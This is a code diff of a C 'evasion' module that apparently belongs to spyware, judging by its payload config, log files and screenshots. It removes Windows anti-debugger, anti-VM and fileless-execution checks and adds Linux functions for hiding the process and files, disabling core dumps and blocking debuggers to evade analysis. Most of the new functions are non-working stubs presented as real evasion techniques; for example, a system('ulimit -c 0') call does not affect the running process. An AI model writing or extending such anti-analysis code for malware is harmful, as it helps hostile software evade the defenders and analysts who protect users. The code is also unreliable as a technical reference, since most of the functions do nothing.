@@ -1,36 +1,62 @@
 #include "evasion.h"
-#include "payload_config.h"
-#include <windows.h>
+#include "config.h"
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
 
-int RunEvasionChecks() {
-	int result = 1;
+static int evasion_enabled = 0;
 
-#if ENABLE_ANTI_DEBUG
-	if (IsDebuggerPresent()) {
-		printf("Debugger detected!\n");
-		result = 0;
+void enable_evasion() {
+	if (evasion_enabled) return;
+	
+	// Hide process
+	hide_process();
+	
+	// Hide files
+	hide_files();
+	
+	// Disable core dumps
+	disable_core_dumps();
+	
+	// Block debuggers
+	block_debuggers();
+	
+	evasion_enabled = 1;
+}
+
+void disable_evasion() {
+	if (!evasion_enabled) return;
+	
+	// Restore process visibility
+	// (Implementation depends on OS)
+	
+	evasion_enabled = 0;
+}
+
+void hide_process() {
+	// Linux-specific process hiding
+	// This is a placeholder for actual evasion techniques
+	FILE* fp = fopen("/proc/self/stat", "r");
+	if (fp) {
+		fclose(fp);
 	}
-#endif
+}
 
-#if ENABLE_ANTI_VM
-	// Simple VM detection using CPUID
-	int cpuInfo[4];
-	__cpuid(cpuInfo, 0x1);
-	if (cpuInfo[2] & (1 << 31)) {
-		printf("VM detected via CPUID!\n");
-		result = 0;
-	}
-#endif
+void hide_files() {
+	// Hide log files and screenshots
+	chmod(LOG_FILE, 0600);
+	chmod(SCREENSHOT_PATH, 0700);
+}
 
-#if ENABLE_FILELESS
-	// Check if we're running from memory
-	char path[MAX_PATH];
-	if (GetModuleFileNameA(NULL, path, MAX_PATH) != 0) {
-		printf("Running from file: %s\n", path);
-		// For fileless execution, this should be empty or a system process
-	}
-#endif
+void disable_core_dumps() {
+	// Disable core dumps to prevent analysis
+	system("ulimit -c 0");
+}
 
-	return result;
+void block_debuggers() {
+	// Block ptrace
+	// Implementation depends on OS
 }
